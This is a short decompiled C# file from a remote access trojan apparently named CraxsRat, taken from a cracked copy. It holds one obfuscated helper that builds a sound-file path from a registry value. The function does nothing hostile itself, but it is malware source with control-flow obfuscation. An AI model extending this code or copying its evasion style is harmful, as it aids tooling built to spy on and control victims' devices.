// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.clrSAVE
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Microsoft.VisualBasic.CompilerServices;

#nullable disable
namespace Craxs_Rat
{
  [StandardModule]
  internal sealed class clrSAVE
  {
    public static VB\u0024AnonymousDelegate_0 \u0024I228\u002D2;
    public static VB\u0024AnonymousDelegate_0 \u0024I228\u002D3;

    public static string getsoundpath()
    {
      string soundId = RegistryHandler.GET_SoundID();
label_1:
      int num1 = 1367861577;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -(-(num1 * 1273058277 - (--1895739554 - (1915499505 - ---1395378619)) - 1259215831) - ~351018663)) % 5U)
        {
          case 1:
            soundId = EXGuarder.\u003126C666C;
            num1 = (int) num2 * 1866242597 ^ 282016147;
            continue;
          case 2:
            str = Settings.path_File.Replace(EXGuarder.\u0032A64736F, soundId);
            num1 = -554121620;
            continue;
          case 3:
            int num3 = soundId != null ? 1600627406 : (num3 = 1394216518);
            num1 = num3 ^ (int) num2 * -274170551;
            continue;
          case 4:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_6:
      return str;
    }
  }
}
